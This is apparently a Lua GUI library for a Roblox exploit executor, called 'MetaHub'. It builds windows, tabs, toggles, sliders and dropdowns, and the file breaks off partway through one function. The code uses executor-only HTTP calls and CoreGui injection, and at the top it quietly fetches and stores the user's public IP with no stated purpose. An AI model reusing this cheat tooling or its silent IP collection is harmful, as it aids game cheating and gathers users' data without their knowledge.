local Library = {}
local UserInputService = game:GetService("UserInputService")
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local ip = decoded["origin"]


local function MakeDraggable(topbarobject, object)
	local Dragging = nil
	local DragInput = nil
	local DragStart = nil
	local StartPosition = nil

	local function Update(input)
		local Delta = input.Position - DragStart
		local pos =
			UDim2.new(
				StartPosition.X.Scale,
				StartPosition.X.Offset + Delta.X,
				StartPosition.Y.Scale,
				StartPosition.Y.Offset + Delta.Y
			)
		object.Position = pos
	end

	topbarobject.InputBegan:Connect(
		function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				Dragging = true
				DragStart = input.Position
				StartPosition = object.Position

				input.Changed:Connect(
					function()
						if input.UserInputState == Enum.UserInputState.End then
							Dragging = false
						end
					end
				)
			end
		end
	)

	topbarobject.InputChanged:Connect(
		function(input)
			if
				input.UserInputType == Enum.UserInputType.MouseMovement or
				input.UserInputType == Enum.UserInputType.Touch
			then
				DragInput = input
			end
		end
	)

	UserInputService.InputChanged:Connect(
		function(input)
			if input == DragInput and Dragging then
				Update(input)
			end
		end
	)
end

function Library:CreateWindow(vers)
	print("loaded")
	vers = vers or ""
	print(vers)
	local Meta = Instance.new("ScreenGui")
	Meta.Parent = game.CoreGui
	Meta.DisplayOrder = 5
	local Main = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local TopBar = Instance.new("Frame")
	local HubName = Instance.new("TextLabel")
	local UICorner_2 = Instance.new("UICorner")
	local MainTabs = Instance.new("Frame")
	local UICorner_3 = Instance.new("UICorner")
	local Tabs = Instance.new("Frame")
	local UIListLayout_2 = Instance.new("UIListLayout")
	local UIPadding_2 = Instance.new("UIPadding")
	local ver = Instance.new("TextLabel")
	local Logs = Instance.new("Frame")
	local ScrollingFrame = Instance.new("ScrollingFrame")
	local log = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local UIListLayout_4 = Instance.new("UIListLayout")
	local console = Instance.new("TextBox")

	--Properties:



	Logs.Name = "Logs"
	Logs.Parent = Meta
	Logs.BackgroundColor3 = Color3.fromRGB(72, 53, 64)
	Logs.BackgroundTransparency = 0.200
	Logs.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Logs.BorderSizePixel = 0
	Logs.Size = UDim2.new(1, 0, 1.5, 0)
	Logs.Visible = false
	Logs.AnchorPoint = Vector2.new(0,.5)
	Logs.Position = UDim2.new(0,0,0.5,0)


	ScrollingFrame.Parent = Logs
	ScrollingFrame.Active = true
	ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ScrollingFrame.BackgroundTransparency = 1.000
	ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	ScrollingFrame.BorderSizePixel = 0
	ScrollingFrame.Size = UDim2.new(1, 0, 1.035, 0)
	ScrollingFrame.Position = UDim2.new(0,0,0.2,0)
	ScrollingFrame.ScrollBarThickness = 2

	console.Name = "console"
	console.Parent = Logs
	console.BackgroundColor3 = Color3.fromRGB(48, 37, 48)
	console.BackgroundTransparency = 0.400
	console.BorderColor3 = Color3.fromRGB(0, 0, 0)
	console.BorderSizePixel = 0
	console.Size = UDim2.new(1, 0, 0.035, 0)
	console.ZIndex = 2
	console.Font = Enum.Font.SourceSansBold
	console.Text = ""
	console.PlaceholderText = "Type here"
	console.TextColor3 = Color3.fromRGB(255, 255, 255)
	console.TextSize = 14.000
	console.TextXAlignment = Enum.TextXAlignment.Left
	console.Position =UDim2.new(0,0,0.165,0)


	UIListLayout_4.Parent = ScrollingFrame
	UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder

	Meta.Name = "Meta"

	Meta.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	Main.Name = "Main"
	Main.Parent = Meta
	Main.BackgroundColor3 = Color3.fromRGB(47, 38, 54)
	Main.BackgroundTransparency = 0.200
	Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Main.BorderSizePixel = 0
	Main.Position = UDim2.new(0.275636852, 0, 0.187898085, 0)
	Main.Size = UDim2.new(0, 547, 0, 354)


	UICorner.Parent = Main

	TopBar.Name = "TopBar"
	TopBar.Parent = Main
	TopBar.BackgroundColor3 = Color3.fromRGB(28, 24, 33)
	TopBar.BackgroundTransparency = 0.990
	TopBar.BorderColor3 = Color3.fromRGB(0, 0, 0)
	TopBar.BorderSizePixel = 0
	TopBar.Size = UDim2.new(1, 0, 0.0408204496, 20)

	HubName.Name = "HubName"
	HubName.Parent = TopBar
	HubName.AnchorPoint = Vector2.new(0, 0.5)
	HubName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	HubName.BackgroundTransparency = 1.000
	HubName.BorderColor3 = Color3.fromRGB(0, 0, 0)
	HubName.BorderSizePixel = 0
	HubName.Position = UDim2.new(0.024999978, 0, 0.49999994, 0)
	HubName.Size = UDim2.new(0.0554387793, 50, 0.699999988, 0)
	HubName.Font = Enum.Font.SourceSansBold
	HubName.Text = "MetaHub"
	HubName.TextColor3 = Color3.fromRGB(255, 255, 255)
	HubName.TextScaled = true
	HubName.TextSize = 14.000
	HubName.TextWrapped = true
	HubName.TextXAlignment = Enum.TextXAlignment.Left

	UICorner_2.Parent = TopBar

	MainTabs.Name = "MainTabs"
	MainTabs.Parent = Main
	MainTabs.BackgroundColor3 = Color3.fromRGB(32, 28, 38)
	MainTabs.BackgroundTransparency = 0.200
	MainTabs.BorderColor3 = Color3.fromRGB(0, 0, 0)
	MainTabs.BorderSizePixel = 0
	MainTabs.Position = UDim2.new(0.0109689217, 0, 0.0973176286, 0)
	MainTabs.Size = UDim2.new(0, 535, 0, 313)

	UICorner_3.Parent = MainTabs

	Tabs.Name = "Tabs"
	Tabs.Parent = Main
	Tabs.BackgroundColor3 = Color3.fromRGB(28, 24, 33)
	Tabs.BackgroundTransparency = 1.000
	Tabs.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Tabs.BorderSizePixel = 0
	Tabs.Position = UDim2.new(0.261, 0, 0, 0)
	Tabs.Size = UDim2.new(0.666, 0, 0.1, 0)

	ver.Name = "ver"
	ver.Parent = TopBar
	ver.AnchorPoint = Vector2.new(0, 0.5)
	ver.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ver.BackgroundTransparency = 1.000
	ver.BorderColor3 = Color3.fromRGB(0, 0, 0)
	ver.BorderSizePixel = 0
	ver.Position = UDim2.new(0.174999997, 0, 0.519999981, 0)
	ver.Size = UDim2.new(0.077726461, 0, 0.520000041, 0)
	ver.Font = Enum.Font.SourceSansBold
	ver.Text = "v"..vers

	ver.TextColor3 = Color3.fromRGB(255, 255, 255)
	ver.TextSize = 15.000
	ver.TextWrapped = true
	ver.TextXAlignment = Enum.TextXAlignment.Left
	ver.TextYAlignment = Enum.TextYAlignment.Bottom


	UIListLayout_2.Parent = Tabs
	UIListLayout_2.FillDirection = Enum.FillDirection.Horizontal
	UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder

	UIPadding_2.Parent = Tabs
	UIPadding_2.PaddingTop = UDim.new(0, 5)

	MakeDraggable(TopBar,Main)

	UserInputService.InputBegan:Connect(function(input)
		if input.KeyCode == Enum.KeyCode.Tab then
			print('pressing tab')
			Main.Visible = not Main.Visible
		elseif input.KeyCode == Enum.KeyCode.O then
			print('pressing O')
			Logs.Visible = not Logs.Visible
		end

	end)

	console.FocusLost:Connect(function(a)
		if a then
			if #console.Text > 0 then
				if console.Text == '/clear' then
					for i,v in pairs(ScrollingFrame:GetChildren()) do
						if v:IsA("Frame")then
							v:Destroy()
						end
					end
				end
			end
		end
	end)



	local inLib = {}

	function inLib:CreateTab(text)
		text = text or "New Tab"
		local ts = game:GetService("TweenService")
		local Player_2 = Instance.new("TextButton")
		local Player = Instance.new("Frame")
		local UIPadding = Instance.new("UIPadding")
		local UIGridLayout = Instance.new("UIGridLayout")

		Player_2.Name = text
		Player_2.Parent = Tabs
		Player_2.AnchorPoint = Vector2.new(0, 0.5)
		Player_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Player_2.BackgroundTransparency = 1.000
		Player_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Player_2.BorderSizePixel = 0
		Player_2.Position = UDim2.new(0, 0, 0.5, 0)
		Player_2.Size = UDim2.new(0, 60, 0.800000012, 0)
		Player_2.Font = Enum.Font.SourceSansBold
		Player_2.Text = text
		Player_2.TextColor3 = Color3.new(0.705882, 0.639216, 0.72549)
		Player_2.TextSize = 17.000
		Player_2.TextWrapped = true

		Player.Name = text.. " Tab"
		Player.Parent = MainTabs
		Player.Active = true
		Player.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Player.BackgroundTransparency = 1.000
		Player.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Player.BorderSizePixel = 0
		Player.Size = UDim2.new(1, 0, 1, 0)
		Player.Visible =false

		UIPadding.Parent = Player
		UIPadding.PaddingLeft = UDim.new(0, 8)
		UIPadding.PaddingTop = UDim.new(0, 8)

		UIGridLayout.Parent = Player
		UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
		UIGridLayout.CellPadding = UDim2.new(0, 8, 0, 5)
		UIGridLayout.CellSize = UDim2.new(0.485000014, 0, 1, -8)


		Player_2.MouseButton1Click:Connect(function()
			for i,v in next,MainTabs:GetChildren() do
				if v:IsA("Frame") or v:IsA("ScrollingFrame") then
					v.Visible = false
				end
			end
			for i2,v2 in pairs(Tabs:GetChildren()) do
				if v2:IsA("TextButton") then
					ts:Create(v2,TweenInfo.new(.5),{TextColor3 = Color3.new(0.705882, 0.639216, 0.72549)}):Play()
				end
			end
			ts:Create(Player_2,TweenInfo.new(.5),{TextColor3 = Color3.new(0.972549, 0.882353, 1)}):Play()
			Player.Visible = true
		end)

		local insideTab = {}

		function insideTab:createSubTab(text)
			text = text or "New SubTab"
			local Movement = Instance.new("Frame")
			local UICorner_4 = Instance.new("UICorner")
			local Label = Instance.new("TextLabel")
			local Holder = Instance.new("ScrollingFrame")

			local UIListLayout = Instance.new("UIListLayout")

			Movement.Name = text.." SubTab"
			Movement.Parent = Player
			Movement.AnchorPoint = Vector2.new(0.5, 0.5)
			Movement.BackgroundColor3 = Color3.fromRGB(54, 48, 61)
			Movement.BackgroundTransparency = 0.200
			Movement.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Movement.BorderSizePixel = 0
			Movement.Position = UDim2.new(0.25413084, 0, 0.5, 0)
			Movement.Size = UDim2.new(0.48300001, 0, 0.833000004, 40)


			Holder.Name = "Holder"
			Holder.Parent = Movement
			Holder.BackgroundTransparency = 1
			Holder.Size = UDim2.new(1,0,.91,0)
			Holder.Position = UDim2.new(0,0,0.09,0)
			Holder.CanvasSize = UDim2.new(1,0,1.5,0)
			Holder.ScrollingDirection = Enum.ScrollingDirection.Y
			Holder.ScrollBarImageTransparency = 1

			Label.Name = "Label"
			Label.Parent = Movement
			Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Label.BackgroundTransparency = 1.000
			Label.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Label.BorderSizePixel = 0
			Label.Size = UDim2.new(1, 0, 0, 20)
			Label.Font = Enum.Font.SourceSansBold
			Label.Text = text
			Label.TextColor3 = Color3.fromRGB(180, 163, 185)
			Label.TextSize = 14.000

			UIListLayout.Parent = Holder
			UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			UIListLayout.Padding = UDim.new(0, 6)

			UICorner_4.Parent = Movement

			local content = {}

			function content:CreateToggle(text,toggled, callback)
				toggled = toggled or false
				text = text or "New Toggle"
				callback = callback or function() end
				local Toggled = toggled or false
				local Toggle = Instance.new("Frame")
				local Button = Instance.new("TextButton")
				local Label_2 = Instance.new("TextLabel")


				Toggle.Name = text.. " Toggle"
				Toggle.Parent = Holder
				Toggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Toggle.BackgroundTransparency = 1.000
				Toggle.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Toggle.BorderSizePixel = 0
				Toggle.Position = UDim2.new(0, 0, 0.161904767, 0)
				Toggle.Size = UDim2.new(.99, 0, 0, 20)

				Button.Name = "Button"
				Button.Parent = Toggle
				Button.AnchorPoint = Vector2.new(0, 0.5)
				Button.BackgroundColor3 = Color3.fromRGB(64, 57, 72)
				Button.BorderColor3 = Color3.fromRGB(180, 163, 185)
				Button.Position = UDim2.new(0.0500000007, 0, 0.5, 0)
				Button.Size = UDim2.new(0, 12, 0, 12)
				Button.Font = Enum.Font.SourceSans
				Button.Text = ""
				Button.TextSize = 14.000

				Label_2.Name = "Label"
				Label_2.Parent = Toggle
				Label_2.AnchorPoint = Vector2.new(0, 0.5)
				Label_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Label_2.BackgroundTransparency = 1.000
				Label_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Label_2.BorderSizePixel = 0
				Label_2.Position = UDim2.new(0.180000007, 0, 0.5, 0)
				Label_2.Size = UDim2.new(0.5, 0, 1, 0)
				Label_2.Font = Enum.Font.SourceSansBold
				Label_2.Text = text
				Label_2.TextColor3 = Color3.fromRGB(180, 163, 185)
				Label_2.TextSize = 16.000
				Label_2.TextXAlignment = Enum.TextXAlignment.Left

				if toggled == false then
					Button.BackgroundColor3 = Color3.fromRGB(64, 57, 72)

				else
					Button.BackgroundColor3 = Color3.fromRGB(180, 163, 185)
				end

				Button.MouseButton1Click:Connect(function()
					if Toggled == false then
						Button.BackgroundColor3 = Color3.fromRGB(180, 163, 185)

					else
						Button.BackgroundColor3 = Color3.fromRGB(64, 57, 72)
					end

					Toggled = not Toggled
					pcall(callback,Toggled)
				end)
			end

			function content:CreateSlider(text,min,max,start,callback)
				text = text or "New Slider"
				min = min or 0
				max = max or 100
				start = start or 50
				callback = callback or function() end
				local WalkspeedSlider = Instance.new("Frame")
				local Label_3 = Instance.new("TextLabel")
				local SliderBack = Instance.new("Frame")
				local Draggable = Instance.new("Frame")
				local Amount = Instance.new("TextLabel")
				local uis = game:GetService("UserInputService")
				local mouse = game.Players.LocalPlayer:GetMouse()

				WalkspeedSlider.Name = text.." Slider"
				WalkspeedSlider.Parent = Holder
				WalkspeedSlider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				WalkspeedSlider.BackgroundTransparency = 1.000
				WalkspeedSlider.BorderColor3 = Color3.fromRGB(0, 0, 0)
				WalkspeedSlider.BorderSizePixel = 0
				WalkspeedSlider.Position = UDim2.new(0, 0, 0.247619048, 0)
				WalkspeedSlider.Size = UDim2.new(.99, 0, 0.0809523836, 20)

				Label_3.Name = "Label"
				Label_3.Parent = WalkspeedSlider
				Label_3.AnchorPoint = Vector2.new(0, 0.5)
				Label_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Label_3.BackgroundTransparency = 1.000
				Label_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Label_3.BorderSizePixel = 0
				Label_3.Position = UDim2.new(0.0499999337, 0, 0.25, 0)
				Label_3.Size = UDim2.new(0.674982905, 0, 0.5, 0)
				Label_3.Font = Enum.Font.SourceSansBold
				Label_3.Text = text
				Label_3.TextColor3 = Color3.fromRGB(180, 163, 185)
				Label_3.TextSize = 16.000
				Label_3.TextXAlignment = Enum.TextXAlignment.Left

				SliderBack.Name = "SliderBack"
				SliderBack.Parent = WalkspeedSlider
				SliderBack.BackgroundColor3 = Color3.fromRGB(54, 48, 61)
				SliderBack.BorderColor3 = Color3.fromRGB(180, 163, 185)
				SliderBack.Position = UDim2.new(0.0500000007, 0, 0.6, 0)
				SliderBack.Size = UDim2.new(0.899999976, 0, 0.300000012, 0)

				Draggable.Name = "Draggable"
				Draggable.Parent = SliderBack
				Draggable.BackgroundColor3 = Color3.fromRGB(180, 163, 185)
				Draggable.BorderSizePixel = 0
				Draggable.Size = UDim2.fromScale(((start-min)/(max-min)), 1)

				Amount.Name = "Amount"
				Amount.Parent = SliderBack
				Amount.BackgroundColor3 = Color3.fromRGB(180, 163, 185)
				Amount.BackgroundTransparency = 1.000
				Amount.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Amount.BorderSizePixel = 0
				Amount.Size = UDim2.new(1, 0, 1, 0)
				Amount.ZIndex = 2
				Amount.Font = Enum.Font.SourceSansBold
				Amount.Text = tostring(start).."/"..max
				Amount.TextColor3 = Color3.fromRGB(255, 255, 255)
				Amount.TextSize = 15.000
				Amount.TextWrapped = true

				local slider = {
					Hover = false,
					MouseDown = false,
					Connection = nil,
					val = start,
				}

				function slider:SetValue(v)
					if v == nil then
						local per = math.clamp((mouse.X - SliderBack.AbsolutePosition.X)/(SliderBack.AbsoluteSize.X),0,1)
						local val= math.floor(((max-min)*per)+min)
						Amount.Text = tostring(val).."/"..max
						Draggable.Size = UDim2.fromScale(per,1)
						slider.val = val

					else
						Amount.Text = tostring(v).."/"..max
						Draggable.Size = UDim2.fromScale(((v-min)/(max-min)), 1)
						slider.val = start

					end
					callback(slider:getValue())
				end

				function slider:getValue()
					return slider.val
				end


				WalkspeedSlider.MouseEnter:Connect(function()
					slider.Hover = true
				end)

				WalkspeedSlider.MouseLeave:Connect(function()
					slider.Hover = false
				end)

				uis.InputBegan:Connect(function(input)

					if input.UserInputType == Enum.UserInputType.MouseButton1 and slider.Hover then
						slider.MouseDown = true
						Main.Draggable = false
						if not slider.Connection then
							slider.Connection = game:GetService("RunService").RenderStepped:Connect(function()
								slider:SetValue()
							end)
						end
					end

				end)

				uis.InputEnded:Connect(function(input, gpe)

					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						slider.MouseDown = false
						Main.Draggable = true
						if slider.Connection then slider.Connection:Disconnect() end
						slider.Connection = nil
					end
				end)
			end

			function content:CreateTextbox(name,text, callback)
				name = name or "New Textbox"
				text = text or "New Textbox"
				callback = callback or function() end
				local WebhookURL = Instance.new("Frame")
				local Label_17 = Instance.new("TextLabel")
				local TextBox = Instance.new("TextBox")
				local UICorner_10 = Instance.new("UICorner")

				WebhookURL.Name = "WebhookURL"
				WebhookURL.Parent = Holder
				WebhookURL.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				WebhookURL.BackgroundTransparency = 1.000
				WebhookURL.BorderColor3 = Color3.fromRGB(0, 0, 0)
				WebhookURL.BorderSizePixel = 0
				WebhookURL.Position = UDim2.new(0, 0, 0.161904767, 0)
				WebhookURL.Size = UDim2.new(.98, 0, 0, 20)

				Label_17.Name = "Label"
				Label_17.Parent = WebhookURL
				Label_17.AnchorPoint = Vector2.new(0, 0.5)
				Label_17.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Label_17.BackgroundTransparency = 1.000
				Label_17.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Label_17.BorderSizePixel = 0
				Label_17.Position = UDim2.new(0.0500000231, 0, 0.5, 0)
				Label_17.Size = UDim2.new(0.204343647, 0, 1, 0)
				Label_17.Font = Enum.Font.SourceSansBold
				Label_17.Text = name
				Label_17.TextColor3 = Color3.fromRGB(180, 163, 185)
				Label_17.TextSize = 16.000
				Label_17.TextXAlignment = Enum.TextXAlignment.Left

				TextBox.Parent = WebhookURL
				TextBox.BackgroundColor3 = Color3.fromRGB(30, 27, 34)
				TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextBox.BorderSizePixel = 0
				TextBox.Position = UDim2.new(0.5, 0, 0, 0)
				TextBox.Size = UDim2.new(0.47, 0, 1, 0)
				TextBox.Font = Enum.Font.SourceSansBold
				TextBox.Text = text
				TextBox.TextColor3 = Color3.fromRGB(139, 126, 143)
				TextBox.TextSize = 14.000
				TextBox.ClipsDescendants = true

				UICorner_10.Parent = TextBox
				TextBox.FocusLost:Connect(function(e)
					if e then
						if #TextBox.Text > 0 then
							pcall(callback,TextBox.Text)
						end
					end
				end)
			end

			function content:CreateButton(name,callback)
				name = name or "New Button"
				callback = callback or function() end
				local WebhookURL_2 = Instance.new("Frame")
				local Label_6 = Instance.new("TextLabel")
				local TextButton = Instance.new("TextButton")
				local UICorner_6 = Instance.new("UICorner")

				WebhookURL_2.Name = name
				WebhookURL_2.Parent = Holder
				WebhookURL_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				WebhookURL_2.BackgroundTransparency = 1.000
				WebhookURL_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
				WebhookURL_2.BorderSizePixel = 0
				WebhookURL_2.Position = UDim2.new(0, 0, 0.161904767, 0)
				WebhookURL_2.Size = UDim2.new(.98, 0, 0, 20)

				Label_6.Name = "Label"
				Label_6.Parent = WebhookURL_2
				Label_6.AnchorPoint = Vector2.new(0, 0.5)
				Label_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Label_6.BackgroundTransparency = 1.000
				Label_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Label_6.BorderSizePixel = 0
				Label_6.Position = UDim2.new(0.0500000231, 0, 0.5, 0)
				Label_6.Size = UDim2.new(0.204343647, 0, 1, 0)
				Label_6.Font = Enum.Font.SourceSansBold
				Label_6.Text = name
				Label_6.TextColor3 = Color3.fromRGB(180, 163, 185)
				Label_6.TextSize = 16.000
				Label_6.TextXAlignment = Enum.TextXAlignment.Left

				TextButton.Parent = WebhookURL_2
				TextButton.BackgroundColor3 = Color3.fromRGB(30, 27, 34)
				TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextButton.BorderSizePixel = 0
				TextButton.Position = UDim2.new(0.689999998, 0, 0, 0)
				TextButton.Size = UDim2.new(0.280000001, 0, 1, 0)
				TextButton.Font = Enum.Font.SourceSansBold
				TextButton.TextColor3 = Color3.fromRGB(139, 126, 143)
				TextButton.TextSize = 14.000
				TextButton.Text = ""

				UICorner_6.Parent = TextButton

				TextButton.MouseButton1Click:Connect(function()
					pcall(callback)
				end)
			end

			function content:CreateDropdown(name, last, layer,callback)
				name = name or "New Dropdown"
				last = last or ""
				layer = layer or 10
				callback = callback or function() end
				local dropdown = {
					items = {
						['id'] = {
							'value'
						}
					}
				}

				local Dropdown = Instance.new("Frame")
				local OptionLabel = Instance.new("Frame")
				local Holder_2 = Instance.new("ScrollingFrame")

				local OptionHolder_2 = Instance.new("Frame")
				local Option_2 = Instance.new("TextButton")
				local OptionHolder_3 = Instance.new("Frame")
				local Option_3 = Instance.new("TextButton")
				local UIListLayout_2 = Instance.new("UIListLayout")
				local OptionName = Instance.new("TextButton")
				local Label_5 = Instance.new("TextLabel")

				Dropdown.Name = "Dropdown"
				Dropdown.Parent = Holder
				Dropdown.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Dropdown.BackgroundTransparency = 1.000
				Dropdown.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Dropdown.BorderSizePixel = 0
				Dropdown.Position = UDim2.new(0, 0, 0.369552642, 0)
				Dropdown.Size = UDim2.new(.99, 0, 0.117952384, 20)
				Dropdown.ZIndex = layer

				OptionLabel.Name = "OptionLabel"
				OptionLabel.Parent = Dropdown
				OptionLabel.BackgroundColor3 = Color3.fromRGB(54, 48, 61)
				OptionLabel.BorderColor3 = Color3.fromRGB(180, 163, 185)
				OptionLabel.Position = UDim2.new(0.0500000007, 0, 0.430000007, 0)
				OptionLabel.Size = UDim2.new(0.899999976, 0, 0, 24)

				Label_5.Name = "Label"
				Label_5.Parent = Dropdown
				Label_5.AnchorPoint = Vector2.new(0, 0.5)
				Label_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Label_5.BackgroundTransparency = 1.000
				Label_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Label_5.BorderSizePixel = 0
				Label_5.Position = UDim2.new(0.0500000007, 0, 0.150000006, 0)
				Label_5.Size = UDim2.new(0.674982905, 0, 0.5, 0)
				Label_5.Font = Enum.Font.SourceSansBold
				Label_5.Text = name
				Label_5.TextColor3 = Color3.fromRGB(180, 163, 185)
				Label_5.TextSize = 16.000
				Label_5.TextXAlignment = Enum.TextXAlignment.Left


				Holder_2.Name = "Holder"
				Holder_2.Parent = OptionLabel
				Holder_2.BackgroundColor3 = Color3.fromRGB(54, 48, 61)
				Holder_2.BorderColor3 = Color3.fromRGB(180, 163, 185)
				Holder_2.ClipsDescendants = true
				Holder_2.Position = UDim2.new(0, 0, 1, 3)
				Holder_2.Size = UDim2.new(1, 0, 0, 78)
				Holder_2.Visible = false
				Holder_2.ZIndex= 10
				Holder_2.ScrollingDirection = Enum.ScrollingDirection.Y
				Holder_2.ScrollBarThickness = 1

				OptionName.Name = "OptionName"
				OptionName.Parent = OptionLabel
				OptionName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				OptionName.BackgroundTransparency = 1.000
				OptionName.BorderColor3 = Color3.fromRGB(0, 0, 0)
				OptionName.BorderSizePixel = 0
				OptionName.Position = UDim2.new(0.0250000004, 0, 0, 0)
				OptionName.Size = UDim2.new(0.975000024, 0, 1, 0)
				OptionName.Font = Enum.Font.SourceSansBold
				OptionName.Text = last
				OptionName.TextColor3 = Color3.fromRGB(180, 163, 185)
				OptionName.TextSize = 16.000
				OptionName.TextXAlignment = Enum.TextXAlignment.Left


				UIListLayout_2.Parent = Holder_2
				UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
				UIListLayout_2.Padding = UDim.new(0, 0)



				OptionName.MouseButton1Click:Connect(function()
					local c = 0
					for i,v in pairs(Holder_2:GetChildren()) do
						if v:IsA("Frame") then
							c +=1
						end
					end
					Holder_2.Size = UDim2.new(1,0,0,72)
					Holder_2.CanvasSize = UDim2.new(1,0,0,(c * 24))
					Holder_2.Visible = not Holder_2.Visible
				end)

				function dropdown:Add(id)
					local OptionHolder = Instance.new("Frame")
					local Option = Instance.new("TextButton")
					OptionHolder.Name = "OptionHolder"
					OptionHolder.Parent = Holder_2
					OptionHolder.BackgroundColor3 = Color3.fromRGB(54, 48, 61)
					OptionHolder.BorderColor3 = Color3.fromRGB(180, 163, 185)
					OptionHolder.Size = UDim2.new(1, 0, 0, 24)
					OptionHolder.ZIndex = 10

					Option.Name = "Option"
					Option.Parent = OptionHolder
					Option.BackgroundColor3 = Color3.fromRGB(54, 48, 61)
					Option.BackgroundTransparency = 1.000
					Option.BorderColor3 = Color3.fromRGB(180, 163, 185)
					Option.Position = UDim2.new(0.0250000004, 0, 0, 0)
					Option.Size = UDim2.new(0.975000024, 0, 0, 23)
					Option.Font = Enum.Font.SourceSansBold
					Option.TextColor3 = Color3.fromRGB(180, 163, 185)
					Option.TextSize = 16.000
					Option.TextXAlignment = Enum.TextXAlignment.Left
					Option.Text = id

					Option.MouseButton1Click:Connect(function()
						callback(id)
						print("this"..id)
						OptionName.Text = id
						Holder_2.Visible = false
					end)
				end

				return dropdown
			end

			function content:CreateMultiDropdown(name, last, layer, items,callback)
				name = name or "New Dropdown"
				last = last or ""
				layer = layer or 10
				callback = callback or function() end
				local multidropdown = {}
				items = items or {}
				print(items)
				local Dropdown = Instance.new("Frame")
				local OptionLabel = Instance.new("Frame")
				local Holder_2 = Instance.new("ScrollingFrame")

				local OptionHolder_2 = Instance.new("Frame")
				local Option_2 = Instance.new("TextButton")
				local OptionHolder_3 = Instance.new("Frame")
				local Option_3 = Instance.new("TextButton")
				local UIListLayout_2 = Instance.new("UIListLayout")
				local OptionName = Instance.new("TextButton")
				local Label_5 = Instance.new("TextLabel")

				Dropdown.Name = "Dropdown"
				Dropdown.Parent = Holder
				Dropdown.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Dropdown.BackgroundTransparency = 1.000
				Dropdown.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Dropdown.BorderSizePixel = 0
				Dropdown.Position = UDim2.new(0, 0, 0.369552642, 0)
				Dropdown.Size = UDim2.new(.99, 0, 0.117952384, 20)
				Dropdown.ZIndex = layer

				OptionLabel.Name = "OptionLabel"
				OptionLabel.Parent = Dropdown
				OptionLabel.BackgroundColor3 = Color3.fromRGB(54, 48, 61)
				OptionLabel.BorderColor3 = Color3.fromRGB(180, 163, 185)
				OptionLabel.Position = UDim2.new(0.0500000007, 0, 0.430000007, 0)
				OptionLabel.Size = UDim2.new(0.899999976, 0, 0, 24)

				Label_5.Name = "Label"
				Label_5.Parent = Dropdown
				Label_5.AnchorPoint = Vector2.new(0, 0.5)
				Label_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Label_5.BackgroundTransparency = 1.000
				Label_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Label_5.BorderSizePixel = 0
				Label_5.Position = UDim2.new(0.0500000007, 0, 0.150000006, 0)
				Label_5.Size = UDim2.new(0.674982905, 0, 0.5, 0)
				Label_5.Font = Enum.Font.SourceSansBold
				Label_5.Text = name
				Label_5.TextColor3 = Color3.fromRGB(180, 163, 185)
				Label_5.TextSize = 16.000
				Label_5.TextXAlignment = Enum.TextXAlignment.Left


				Holder_2.Name = "Holder"
				Holder_2.Parent = OptionLabel
				Holder_2.BackgroundColor3 = Color3.fromRGB(54, 48, 61)
				Holder_2.BorderColor3 = Color3.fromRGB(180, 163, 185)
				Holder_2.ClipsDescendants = true
				Holder_2.Position = UDim2.new(0, 0, 1, 3)
				Holder_2.Size = UDim2.new(1, 0, 0, 78)
				Holder_2.Visible = false
				Holder_2.ZIndex= 10
				Holder_2.ScrollingDirection = Enum.ScrollingDirection.Y
				Holder_2.ScrollBarThickness = 1

				OptionName.Name = name
				OptionName.Parent = OptionLabel
				OptionName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				OptionName.BackgroundTransparency = 1.000
				OptionName.BorderColor3 = Color3.fromRGB(0, 0, 0)
				OptionName.BorderSizePixel = 0
				OptionName.Position = UDim2.new(0.0250000004, 0, 0, 0)
